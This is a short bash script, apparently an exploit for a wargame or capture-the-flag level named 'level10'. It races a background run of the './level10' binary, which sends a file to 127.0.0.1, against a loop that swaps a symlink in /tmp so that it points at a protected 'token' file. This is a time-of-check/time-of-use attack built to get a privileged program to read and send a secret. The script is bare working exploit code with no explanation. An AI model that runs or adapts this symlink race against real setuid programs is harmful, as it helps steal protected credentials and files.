#!/bin/bash

rm -rf /tmp/test /tmp/ok
echo "saucisse" > /tmp/ok
ln -s /tmp/ok /tmp/test

var="/tmp/test"

command_1() {
        ln -sf "/home/user/level10/token" "/tmp/test"
}

command_2() {
        ./level10 $var 127.0.0.1
        echo "2 = $var"
}

command_2 &
command_1

wait

echo "end"